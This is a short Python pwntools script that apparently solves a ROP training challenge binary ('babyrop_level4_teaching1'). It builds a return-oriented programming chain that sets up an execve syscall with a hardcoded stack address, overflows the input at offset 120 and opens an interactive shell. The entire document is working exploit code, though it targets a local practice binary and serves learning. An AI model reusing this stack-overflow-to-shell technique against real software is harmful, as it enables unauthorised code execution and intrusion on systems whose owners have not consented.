from pwn import *
context.clear(arch='amd64')
context.binary = 'babyrop_level4_teaching1'
r = ROP(context.binary)
e = ELF('./babyrop_level4_teaching1')
p = process('./babyrop_level4_teaching1')
gdb.attach(p, 'b main')
def findAddress(addr):
    for i in e.search(addr):
        return i
    return -1
chain = p64(r.find_gadget(['pop rax', 'ret']).address)
chain += p64(0x3b)
chain += p64(r.find_gadget(['pop rdi', 'ret']).address)
chain += p64(0x7fffd6f5adf8)
chain += p64(r.find_gadget(['pop rsi', 'ret']).address)
chain += p64(0x0)
chain += p64(r.find_gadget(['pop rdx', 'ret']).address)
chain += p64(0x0)
chain += p64(r.find_gadget(['syscall']).address)
# send the ROP chain
p.sendline(fit({120:chain}))
p.interactive()